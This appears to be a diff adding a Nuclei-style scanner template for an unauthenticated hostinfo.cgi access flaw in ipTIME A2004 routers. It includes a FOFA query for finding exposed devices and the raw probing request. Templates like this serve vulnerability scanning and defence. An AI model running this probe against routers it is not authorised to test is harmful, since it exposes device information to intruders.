@@ -1,0 +1,25 @@
+id: poc-zgn43s352ol0x3vd
+info:
+  name: IpTIME A2004 hostinfo未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zgn43s352ol0x3vd'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zgn43s352ol0x3vd
+    fofa: title="ipTIME"
+http:
+- raw:
+  - 'GET /login/hostinfo.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Referer: [https://www.baidu.com](https://www.baidu.com)
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
